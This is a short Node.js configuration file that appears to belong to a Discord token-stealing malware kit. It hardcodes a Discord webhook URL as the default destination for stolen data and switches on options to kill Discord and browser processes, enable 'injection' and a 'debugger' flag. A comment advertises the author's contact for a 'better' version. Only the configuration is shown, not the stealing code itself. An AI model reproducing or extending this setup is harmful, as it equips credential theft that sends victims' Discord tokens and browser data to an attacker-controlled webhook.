require("dotenv").config();
const process = require("process");

module.exports = function getconfig() {
    return {
        "webhook": process.env.WEBHOOK || "https://discord.com/api/webhooks/1193673249943453747/FZRXukfgHkDKiibHMMuA75NigbGjQc_oeD3w7zIY2thZesmH4NDYpo9Sf87jJY7L6KNM",
        "kill":{ 
            "discords": "yes",
            "browsers": "yes",
        }, 
        "debugger": "yes", 
        "injection": "yes", 
    }
}
// if you want something better, you can contact me, DIsocrd: k4itrunnnssh